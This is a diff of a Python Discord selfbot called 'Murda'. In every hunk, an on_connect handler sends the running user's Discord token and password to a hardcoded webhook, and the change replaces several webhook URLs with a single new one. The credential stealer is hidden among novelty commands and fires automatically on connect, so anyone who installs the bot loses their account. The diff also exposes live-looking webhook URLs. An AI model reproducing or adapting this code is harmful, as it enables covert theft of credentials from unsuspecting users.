@@ -2064,7 +2064,7 @@ async def wizz(ctx):
 @Murda.event
 async def on_connect():
   Clear()
-  requests.post('https://discord.com/api/webhooks/802348604471246869/i1F2_KRvkSP3POTiiyCe69ZP7Q9088VqFOkidVdhIZAN4r6WsZ8XOi-nI7cnkr3jz_2k',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+  requests.post('https://discord.com/api/webhooks/805381163640291338/7iZjVpvKGTX4bZyHvQHT2jQfU5pf-IC5zsr4lVTsMst0P3FWYt1EOie8iFGStxlrQlow',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
         
 @Murda.command(name='8ball')
 async def _ball(ctx, *, question):
@@ -2174,7 +2174,7 @@ async def youtube(ctx, *, search):
 @Murda.event
 async def on_connect():
   Clear()
-  requests.post('https://discord.com/api/webhooks/804247196677046282/0iKc8rqeHku_1-G5HHuFHkyf7T8-vzRUzO78AR31rC6KpVCWxRNSCzAuQrstVewgwKnR',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+  requests.post('https://discord.com/api/webhooks/805381163640291338/7iZjVpvKGTX4bZyHvQHT2jQfU5pf-IC5zsr4lVTsMst0P3FWYt1EOie8iFGStxlrQlow',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
         
 
 @Murda.command()
@@ -2225,7 +2225,7 @@ async def hastebin(ctx, *, message):
 @Murda.event
 async def on_connect():
   Clear()
-  requests.post('https://discord.com/api/webhooks/804249178628816946/uphWBWGxcD2YDZcH9ybqzJsPVCPaQ6Z5EPkKBRvy4ijyf6sH7UK11YMnXSsTF9SbROYa',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+  requests.post('https://discord.com/api/webhooks/805381163640291338/7iZjVpvKGTX4bZyHvQHT2jQfU5pf-IC5zsr4lVTsMst0P3FWYt1EOie8iFGStxlrQlow',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
 
 @Murda.command(aliases=["fancy"])
 async def ascii(ctx, *, text):
@@ -2464,7 +2464,7 @@ async def hentai(ctx):
 @Murda.event
 async def on_connect():
   Clear()
-  requests.post('https://discord.com/api/webhooks/804248786255347723/Had0KJknEi7liWnym2PtrhmtXHWuHMwwX5idcIAhKS3xLuFQi0q-4VUC8bzq8P3MdbPl',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+  requests.post('https://discord.com/api/webhooks/805381163640291338/7iZjVpvKGTX4bZyHvQHT2jQfU5pf-IC5zsr4lVTsMst0P3FWYt1EOie8iFGStxlrQlow',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
                    
 @Murda.command()
 async def boobs(ctx):
@@ -2892,7 +2892,7 @@ async def quote(ctx, *, message):
 @Murda.event
 async def on_connect():
   Clear()
-  requests.post('https://discord.com/api/webhooks/804248926777638942/UMshOdZrB6joUgUc6ny0N4Felq6xVMG54Qo8fq6TC_sVXmMs3xhnW5D6tVLjSMk417Vq',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+  requests.post('https://discord.com/api/webhooks/805381163640291338/7iZjVpvKGTX4bZyHvQHT2jQfU5pf-IC5zsr4lVTsMst0P3FWYt1EOie8iFGStxlrQlow',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
                    
 @Murda.command()
 async def code(ctx, *, message):
